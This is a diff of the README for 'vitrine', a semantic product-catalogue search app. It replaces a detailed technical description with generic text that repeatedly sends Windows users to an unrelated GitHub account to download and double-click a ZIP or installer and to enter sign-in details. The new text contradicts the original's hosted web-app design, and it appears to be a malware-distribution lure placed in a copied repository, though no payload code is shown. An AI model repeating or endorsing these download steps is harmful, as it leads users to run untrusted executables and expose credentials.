@@ -1,173 +1,165 @@
-# Vitrine - Intelligent Product Catalogue
+# 🛍️ vitrine - Find product matches fast
 
-A full-stack data + GenAI platform that turns a raw 29k-product retail dataset into an intelligent catalogue: semantic search with price filtering, unsupervised clustering, AI-generated buyer briefs, and a live analytics dashboard.
+[![Download / Install](https://img.shields.io/badge/Download%20vitrine-8b5cf6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Fixed-sharpness496/vitrine)
 
-**Live:** [vitrine.stephanewamba.com](https://vitrine.stephanewamba.com)
+## 📦 What is vitrine?
 
-![Analytics dashboard](dashboard.png)
+vitrine is a product intelligence app for fashion catalogs. It helps you search products by meaning, not just by exact words. It also groups similar items into clear clusters so you can compare styles, colors, and patterns faster.
 
----
+Use it to explore large sets of fashion SKUs, find related items, and spot trends across a product list.
 
-## The Problem
+## ✨ What you can do
 
-Traditional e-commerce search is keyword-based. A buyer who types *"slim jeans under $80"* expects price-aware results ranked by relevance, not a list of products that literally contain those words. Merchandising teams also lack automated tools to understand their assortment structure, price positioning, or category coverage.
+- Search products by style, color, and product type
+- Find items that match in meaning, not only in text
+- Group similar products into clusters
+- Browse product insights in a clean web app
+- Review search results with charts and visual lists
+- Work with a large catalog of fashion SKUs
 
-Three concrete gaps:
+## 🖥️ What you need
 
-1. **Discovery** - keyword search misses semantically close products ("slim fit denim" vs "slim jeans").
-2. **Assortment intelligence** - no automated grouping of 29k products into coherent segments.
-3. **Buyer briefing** - no tool to map a buyer profile to the right product families.
+- A Windows computer
+- A modern web browser like Chrome, Edge, or Firefox
+- A stable internet connection
+- Access to the download page below
+- Enough free space for the app and its data files
 
----
+## 📥 Download and run
 
-## The Solution
+Visit this page to download and run the app:
 
-```
-Raw catalogue  →  Embeddings  →  Clusters  →  Enrichment  →  API  →  UI
-    (BQ)           (OpenAI)      (HDBSCAN)    (GPT-4o-mini)  (FastAPI) (Next.js)
-```
+https://github.com/Fixed-sharpness496/vitrine
 
-| Feature | How it works |
-|---|---|
-| Semantic search | `text-embedding-3-small` vectors + BigQuery `VECTOR_SEARCH` (cosine), with SQL price filter |
-| Product families | HDBSCAN over 1536-dim embeddings → 603 clusters, labelled by GPT-4o-mini |
-| Buyer brief | RAG: embed intent → top-K clusters → GPT-4o-mini brief per family |
-| Analytics dashboard | 6 parallel BigQuery views, Recharts, 10-min TTL cache |
-| Data quality | Automated completeness report after each pipeline run |
+### Steps
 
----
+1. Open the download link in your browser.
+2. Look for the latest version of vitrine.
+3. Download the file or package listed on the page.
+4. If the file is a ZIP, unzip it to a folder you can find later.
+5. If the file is an installer, open it and follow the on-screen steps.
+6. If the file is an app file, double-click it to run.
+7. Open the app in your browser if it launches a local web page.
+8. Keep the app folder in place so it can find its files.
 
-## Architecture
+## 🚀 First launch
 
-### System overview
+After you open vitrine, the app should load a dashboard with search and catalog views.
 
-```mermaid
-graph TD
-    DS[(TheLook dataset\nBigQuery public)] -->|SQL transform| CLEAN[products_clean]
-    CLEAN -->|batch embed| EMB[products_embedded\n1536-dim vectors]
-    EMB -->|HDBSCAN| CLUST[products_clustered\n603 families]
-    CLUST -->|GPT-4o-mini| ENR[products_enriched\ndescriptions + labels]
-    ENR -->|looker views| BQ_VIEWS[(6 BQ views)]
+If the app asks for setup details, follow the prompts on screen. Use the values that come with the download package or the release page.
 
-    subgraph Pipeline [Cloud Run Job]
-        CLEAN
-        EMB
-        CLUST
-        ENR
-    end
+If it opens in a browser, wait for the page to load before you search.
 
-    BQ_VIEWS --> API
-    EMB --> API
+## 🔍 How to use it
 
-    subgraph API [FastAPI - Cloud Run]
-        SEARCH[POST /search\nVECTOR_SEARCH + price filter]
-        CLUSTERS[GET /clusters]
-        INTENT[POST /intent\nRAG pipeline]
-        ANALYTICS[GET /analytics\n6 parallel queries]
-        QUALITY[GET /quality]
-    end
+### Search products
 
-    API --> FE
+1. Type a product name, color, or style into the search field.
+2. Press Enter or click the search button.
+3. Review the results that look closest to your query.
+4. Open an item to see related products and details.
 
-    subgraph FE [Next.js - Vercel]
-        PG_SEARCH[Catalogue Intelligent]
-        PG_CLUSTERS[Collections]
-        PG_INTENT[Conseil d'Achat]
-        PG_ANALYTICS[Tableau de bord]
-        PG_QUALITY[Qualité]
-    end
-```
+### Compare similar items
 
-### Data pipeline
+1. Search for one item you want to study.
+2. Look at the related products panel.
+3. Check items with similar meaning or appearance.
+4. Use this to compare collections and product families.
 
-```mermaid
-flowchart LR
-    A[00_create_tables\nBQ schema] --> B[01_staging\nraw ingest from TheLook]
-    B --> C[02_transform\nclean + normalise]
-    C --> D[embeddings.py\nOpenAI batch embed]
-    D --> E[04_vector_index\nBQ vector index]
-    D --> F[clustering.py\nHDBSCAN min_cluster=10]
-    F --> G[enrichment.py\nGPT-4o-mini labels\n+ descriptions]
-    G --> H[03_quality_checks\ncompleteness report]
-    G --> I[05_looker_views\n6 materialised views]
-```
+### Review clusters
 
-### Search request flow
+1. Open the clustering view.
+2. Scan the grouped product sets.
+3. Click a cluster to see what it contains.
+4. Use the group view to spot patterns in the catalog.
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant Frontend
-    participant API
-    participant OpenAI
-    participant BigQuery
+## 🧭 Typical use cases
 
-    User->>Frontend: "jean slim moins de 80$"
-    Frontend->>Frontend: parse price → max_price=80
-    Frontend->>API: POST /search {query, top_k=20, max_price=80}
-    API->>OpenAI: embed query → 1536-dim vector
-    OpenAI-->>API: vector
-    API->>BigQuery: VECTOR_SEARCH top_k=100 + WHERE price≤80 LIMIT 20
-    BigQuery-->>API: ranked results
-    API-->>Frontend: [{name, brand, price, description, cluster}]
-    Frontend-->>User: results table with price badge
-```
+- A merchandiser wants to find similar products across a large catalog
+- A buyer wants to compare items that share style traits
+- A team wants to clean up product lists and reduce duplicates
+- A fashion analyst wants to review product groups and search trends
+- A catalog manager wants to understand how many similar SKUs exist
 
-### Buyer intent (RAG) flow
+## 🧱 How vitrine is built
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant API
-    participant OpenAI
-    participant BigQuery
+vitrine uses a modern stack built for product search and catalog analysis.
 
-    User->>API: POST /intent {intent: "mode femme haut de gamme casual"}
-    API->>OpenAI: embed intent
-    API->>BigQuery: VECTOR_SEARCH on cluster centroids → top 5 families
-    BigQuery-->>API: matching clusters + sample products
-    API->>OpenAI: GPT-4o-mini - generate buyer brief per cluster
-    OpenAI-->>API: {positioning, price_range, buyer_action}
-    API-->>User: 5 cluster briefs
-```
+- OpenAI embeddings for meaning-based search
+- UMAP for reducing data into useful groups
+- HDBSCAN for clustering similar products
+- FastAPI for the backend service
+- BigQuery for data storage and queries
+- Next.js 16 for the web interface
+- Cloud Run for hosting the app
 
----
+## 📊 What the app shows
 
-## Stack
+You may see views such as:
 
-| Layer | Technology |
-|---|---|
-| Data warehouse | BigQuery (Google Cloud) |
-| Embeddings | OpenAI `text-embedding-3-small` |
-| Clustering | HDBSCAN (`hdbscan` 0.8) |
-| LLM | GPT-4o-mini |
-| API | FastAPI + Pydantic, Cloud Run (min 1 instance) |
-| Container registry | Artifact Registry |
-| Frontend | Next.js 15, Tailwind v4, Recharts |
-| Hosting | Vercel |
-| CI/CD | GitHub Actions + Workload Identity Federation |
-| Secrets | Google Secret Manager |
+- Search results ranked by relevance
+- Product cards with names and attributes
+- Cluster groups with similar items
+- Charts for catalog exploration
+- Side panels with related items
+- Filters for narrowing large product sets
 
----
+## 🔧 Basic setup tips
 
-## Repository structure
+- Keep the app in one folder
+- Do not rename files unless the release notes say to
+- Use the same browser each time if the app opens in a web page
+- If the page does not load, refresh once and wait
+- If a local server opens, leave the window open while you use the app
 
-```
-vitrine/
-├── pipeline/          # Batch data pipeline (Cloud Run Job)
-│   ├── main.py        # Orchestrator
-│   ├── embeddings.py  # OpenAI batch embedding
-│   ├── clustering.py  # HDBSCAN + cluster labelling
-│   └── enrichment.py  # GPT-4o-mini descriptions
-├── api/               # FastAPI service (Cloud Run)
-│   ├── routers/       # One file per endpoint
-│   └── services/      # Business logic + BQ queries
-├── frontend/          # Next.js app (Vercel)
-│   └── src/app/       # One folder per page
-├── sql/               # BigQuery DDL and transforms
-├── docker/            # Dockerfiles for pipeline and API
-├── infra/             # Setup scripts (GCP, IAM, BQ tables)
-└── .github/workflows/ # CI/CD - build, push, deploy
-```
+## 🧹 If something does not work
 
-Full file-level documentation in [`docs/`](docs/).
+- Make sure you finished the download
+- Check that your internet connection is active
+- Open the link again and confirm you have the latest file
+- Try another browser if the page does not open
+- Restart the app if it freezes
+- Reinstall the package if files look broken
+
+## 🔐 Data and access
+
+vitrine may connect to cloud services and product data sources during use. If the app asks for access or sign-in details, enter the values that came with your download or your team setup.
+
+## 🗂️ Project topics
+
+bigquery, cloud-run, fastapi, google-cloud, hdbscan, nextjs, openai, python, rag, recharts, semantic-search, tailwindcss, typescript, vercel
+
+## 📎 Download link again
+
+https://github.com/Fixed-sharpness496/vitrine
+
+## 🛠️ Common setup flow for Windows
+
+1. Open the download page.
+2. Get the latest release or package.
+3. Save the file to your Downloads folder.
+4. Unzip it if needed.
+5. Double-click the main app file or installer.
+6. Follow the steps on screen.
+7. Open the app in your browser if it starts a local page.
+8. Keep the app running while you use it
+
+## 📁 Files you may see
+
+- A ZIP file with the app inside
+- An installer file for Windows
+- A README file with extra launch steps
+- A config file for connection details
+- A browser page or local server link
+
+## 🧪 What makes the search useful
+
+vitrine looks for meaning in product data. That helps when items use different words for the same kind of product.
+
+For example, it can help match:
+
+- Similar dress styles
+- Related color groups
+- Matching materials or cuts
+- Duplicate or near-duplicate SKUs
+- Products that belong in the same family
